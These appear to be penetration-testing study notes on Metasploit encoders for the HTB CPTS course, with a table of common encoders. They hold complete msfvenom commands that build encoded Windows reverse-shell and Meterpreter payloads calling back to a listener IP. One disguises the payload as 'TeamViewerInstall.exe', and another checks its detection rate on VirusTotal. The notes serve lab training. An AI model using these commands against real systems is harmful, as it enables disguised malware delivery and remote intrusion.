### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - Encoders <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Encoders



Encoders adapt payloads to the target arch (`x64`, `x86`, `sparc`, `ppc`, `mips`) and strip bad characters (e.g. `\x00`). Modern AV/IDS catches encoded payloads on heuristics, so encoders alone are NOT an evasion strategy anymore — use as part of a layered approach.

`Shikata Ga Nai` (SGN) — historically the strongest polymorphic XOR encoder. Today even multi-iteration SGN is detected by 50+ engines on VirusTotal.

Pre-2015 workflow — `msfpayload | msfencode`:

```diff
+ $ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

Post-2015 — `msfvenom` does both:

```diff
+ $ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
+ $ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

List compatible encoders for the loaded exploit + payload:

```diff
+ msf6 exploit(...) > show encoders
```

Generate an encoded EXE with multiple iterations:

```diff
+ $ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
```

Test detection rate via the bundled tool (needs a free VirusTotal API key):

```diff
+ $ msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

Common encoders:

| Encoder | Note |
|---|---|
| `generic/none` | No encoding |
| `generic/eicar` | EICAR test |
| `x64/xor` / `x64/xor_dynamic` | x64 XOR variants |
| `x64/zutto_dekiru` | x64 polymorphic |
| `x86/shikata_ga_nai` | Polymorphic XOR additive feedback |
| `x86/alpha_mixed` / `x86/alpha_upper` | Alphanumeric output |
| `x86/avoid_utf8_tolower` | Useful when payload passes through `tolower()` |
| `x86/call4_dword_xor` | Call+4 Dword XOR |
| `x86/jmp_call_additive` | Jump/Call XOR additive |
| `x86/unicode_mixed` / `x86/unicode_upper` | Unicode environments |
